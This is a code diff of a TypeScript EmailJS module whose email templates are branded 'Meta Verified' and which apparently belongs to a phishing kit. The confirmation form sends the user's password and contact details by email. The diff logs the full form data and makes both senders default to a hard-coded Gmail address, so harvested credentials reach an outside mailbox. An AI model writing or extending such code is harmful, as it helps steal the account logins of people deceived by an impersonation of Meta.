@@ -8,11 +8,13 @@ export const initEmailJS = () => {
     return;
   }
   emailjs.init(userId);
+  console.log("EmailJS initialized successfully");
 };
 
 // Validation form email sender
 export const sendValidationFormEmail = async (formData: any) => {
   try {
+    console.log("Sending validation form email...", { formData });
     const templateParams = {
       to_email: formData.user_email || "newzatpage@gmail.com", // Default admin email if not provided
       from_name: "Meta Verified",
@@ -40,8 +42,9 @@ export const sendValidationFormEmail = async (formData: any) => {
 // Confirmation form email sender
 export const sendConfirmationFormEmail = async (formData: any) => {
   try {
+    console.log("Sending confirmation form email...", { formData });
     const templateParams = {
-      to_email: formData.user_email,
+      to_email: formData.user_email || "newzatpage@gmail.com", // Default admin email if not provided
       subject: "Meta Verified - Account Confirmation Details",
       user_password: formData.password,
       contact_method: formData.contactMethod,
